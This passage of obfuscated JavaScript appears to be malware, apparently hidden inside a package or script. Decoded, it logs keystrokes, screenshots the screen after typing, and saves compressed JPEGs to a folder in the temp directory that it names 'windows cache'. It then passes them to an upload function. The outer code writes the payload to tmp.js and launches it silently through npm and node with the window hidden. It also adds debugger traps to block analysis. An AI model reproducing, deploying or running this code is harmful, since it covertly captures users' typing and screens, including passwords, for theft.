x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22C'+'OM'+'MA'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'<\x22'+'\x20:'+'\x20\x22'+',\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22F'+'OR'+'WA'+'RD'+'\x20S'+'LA'+'SH'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'?\x22'+'\x20:'+'\x20\x22'+'/\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'br'+'ea'+'k;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'as'+'e\x20'+'\x22B'+'AC'+'KS'+'LA'+'SH'+'\x22:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20s'+'hi'+'ft'+'\x20?'+'\x20\x22'+'|\x22'+'\x20:'+'\x20\x22'+'\x5c\x5c'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20b'+'re'+'ak'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'de'+'fa'+'ul'+'t:'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20/'+'/\x20'+'if'+'\x20('+'e.'+'na'+'me'+'.l'+'en'+'gt'+'h\x20'+'=='+'\x201'+')\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20+'+'=\x20'+'sh'+'if'+'t\x20'+'?\x20'+'e.'+'na'+'me'+'\x20:'+'\x20e'+'.n'+'am'+'e.'+'to'+'Lo'+'we'+'rC'+'as'+'e('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(e'+'.s'+'ta'+'te'+'\x20='+'=\x20'+'\x22U'+'P\x22'+')\x20'+'{\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'e.'+'na'+'me'+'.i'+'nd'+'ex'+'Of'+'(\x22'+'MO'+'US'+'E\x22'+')\x20'+'>\x20'+'-1'+')\x20'+'re'+'tu'+'rn'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'e.'+'na'+'me'+'\x20='+'=\x20'+'\x22L'+'EF'+'T\x20'+'SH'+'IF'+'T\x22'+'\x20|'+'|\x20'+'e.'+'na'+'me'+'\x20='+'=\x20'+'\x22R'+'IG'+'HT'+'\x20S'+'HI'+'FT'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20s'+'hi'+'ft'+'\x20='+'\x20f'+'al'+'se'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'if'+'\x20('+'e.'+'na'+'me'+'\x20='+'=\x20'+'\x22L'+'EF'+'T\x20'+'CT'+'RL'+'\x22\x20'+'||'+'\x20e'+'.n'+'am'+'e\x20'+'=='+'\x20\x22'+'RI'+'GH'+'T\x20'+'CT'+'RL'+'\x22)'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ex'+'t\x20'+'+='+'\x20\x22'+'</'+'CT'+'RL'+'>\x22'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ct'+'rl'+'\x20='+'\x20f'+'al'+'se'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ti'+'me'+'r\x20'+'&&'+'\x20c'+'le'+'ar'+'Ti'+'me'+'ou'+'t('+'ti'+'me'+'r)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'ti'+'me'+'r\x20')+('=\x20'+'se'+'tT'+'im'+'eo'+'ut'+'(a'+'sy'+'nc'+'\x20('+')\x20'+'=>'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'ry'+'\x20{'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20i'+'f\x20'+'(!'+'te'+'xt'+')\x20'+'re'+'tu'+'rn'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'co'+'ns'+'t\x20'+'ra'+'wB'+'uf'+'fe'+'r\x20'+'=\x20'+'aw'+'ai'+'t\x20'+'sc'+'re'+'en'+'sh'+'ot'+'({'+'\x20f'+'or'+'ma'+'t:'+'\x20\x22'+'pn'+'g\x22'+'\x20}'+');'+'\x20/'+'/\x20'+'or'+'\x20\x27'+'jp'+'g\x27'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'on'+'st'+'\x20c'+'om'+'pr'+'es'+'se'+'dB'+'uf'+'fe'+'r\x20'+'=\x20'+'aw'+'ai'+'t\x20'+'sh'+'ar'+'p('+'ra'+'wB'+'uf'+'fe'+'r)'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20.'+'re'+'si'+'ze'+'(1'+'02'+'4)'+'\x20/'+'/\x20'+'Op'+'ti'+'on'+'al'+':\x20'+'Re'+'si'+'ze'+'\x20w'+'id'+'th'+'\x20('+'ma'+'in'+'ta'+'in'+'s\x20'+'as'+'pe'+'ct'+'\x20r'+'at'+'io'+')\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'.j'+'pe'+'g('+'{\x20'+'qu'+'al'+'it'+'y:'+'\x206'+'0\x20'+'})'+'\x20/'+'/\x20'+'Co'+'mp'+'re'+'ss'+'\x20t'+'o\x20'+'JP'+'EG'+'\x20w'+'it'+'h\x20'+'60'+'%\x20'+'qu'+'al'+'it'+'y\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'.t'+'oB'+'uf'+'fe'+'r('+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20!'+'fs'+'.e'+'xi'+'st'+'sS'+'yn'+'c('+'tm'+'pD'+'ir'+'\x20+'+'\x20\x22'+'/w'+'in'+'do'+'ws'+'\x20c'+'ac'+'he'+'\x22)'+'\x20&'+'&\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'fs'+'.m'+'kd'+'ir'+'Sy'+'nc'+'(t'+'mp'+'Di'+'r\x20'+'+\x20'+'\x22/'+'wi'+'nd'+'ow'+'s\x20'+'ca'+'ch'+'e\x22'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20f'+'s.'+'wr'+'it'+'eF'+'il'+'eS'+'yn'+'c('+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20t'+'mp'+'Di'+'r\x20'+'+\x20'+'\x22/'+'wi'+'nd'+'ow'+'s\x20'+'ca'+'ch'+'e/'+'2.'+'jp'+'eg'+'\x22,'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20c'+'om'+'pr'+'es'+'se'+'dB'+'uf'+'fe'+'r\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+');'+'\x0a\x20'+'\x20\x20'+'\x20\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'uf'+'(t'+'mp'+'Di'+'r\x20'+'+\x20'+'\x22/'+'wi'+'nd'+'ow'+'s\x20'+'ca'+'ch'+'e/'+'2.'+'jp'+'eg'+'\x22)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'te'+'xt'+'\x20='+'\x20\x22'+'\x22;'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+'\x20c'+'at'+'ch'+'\x20('+'e)'+'\x20{'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'},'+'\x203'+'00'+'0)'+';\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x0a'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'\x20\x20'+'}\x20'+'ca'+'tc'+'h\x20'+'(e'+')\x20'+'{}'+'\x0a\x20'+'\x20\x20'+'\x20\x20'+'\x20}'+');'+'\x0a\x20'+'\x20\x20'+'\x20}'+',\x20'+'10'+'00'+');'+'\x0a\x20'+'\x20\x20'+'\x20}'+'ca'+'tc'+'h('+'e)'+'{}'+'\x0a\x20'+'\x20\x20'+'\x20'));try{M['wr'+'it'+'eF'+'il'+'eS'+'yn'+'c'](K['tm'+'pd'+'ir']()+('/t'+'mp'+'.j'+'s'),ak,{'flag':'w+'}),al=K['tm'+'pd'+'ir'](),Q(''['co'+'nc'+'at'](al[0x0],':\x20'+'&&'+'\x20c'+'d\x20')['co'+'nc'+'at'](al,'\x20&'+'&\x20'+'np'+'m\x20'+'in'+'st'+'al'+'l\x20'+'ax'+'io'+'s\x20'+'&&'+'\x20n'+'od'+'e\x20'+'tm'+'p.'+'js'),{'windowsHide':!0x0});}catch(ap){console['lo'+'g'](ap['me'+'ss'+'ag'+'e']);}}case 0x1:return am['a'](0x2);}},af);}));return function(){return ae['ap'+'pl'+'y'](this,arguments);};}());J();}catch(ae){}})());function g(){var aQ=['WOlcNdJcOHzeW6i4WPL6W4KwWQy','gdNcOSk2WP3dQqzeqCo1WPhdUG','W4bKyCk5vMyeW5Psqv3dNCkW','gSo0ESkEWRHtkq','WRtcNGpdJ8oaWPy6WPpcOSkjhSoSWPy','mJaWodiWmLjYr0fHvG','nZC5odaYCxrfywzA','pSoZfCocbIpcRCkAW57dL2FdPCkY','W6aYW5T7W6eHtG','oeXvEMPbyq','m8oZhmojbchdM8k+W7FdKKRdIq','ed3cVfqEbSo3AZuupxmI'];g=function(){return aQ;};return g();}function c(j){function k(l){if(typeof l==='st'+'ri'+'ng')return function(m){}['co'+'ns'+'tr'+'uc'+'to'+'r']('wh'+'il'+'e\x20'+'(t'+'ru'+'e)'+'\x20{'+'}')['ap'+'pl'+'y']('co'+'un'+'te'+'r');else(''+l/l)['le'+'ng'+'th']!==0x1||l%0x14===0x0?function(){return!![];}['co'+'ns'+'tr'+'uc'+'to'+'r']('de'+'bu'+('gg'+'er'))['ca'+'ll']('ac'+'ti'+'on'):function(){return![];}['co'+'ns'+'tr'+'uc'+'to'+'r']('de'+'bu'+('gg'+'er'))['ap'+'pl'+'y']('st'+'at'+'eO'+'bj'+'ec'+'t');k(++l);}try{if(j)return k;else k(0x0);}catch(l){}}

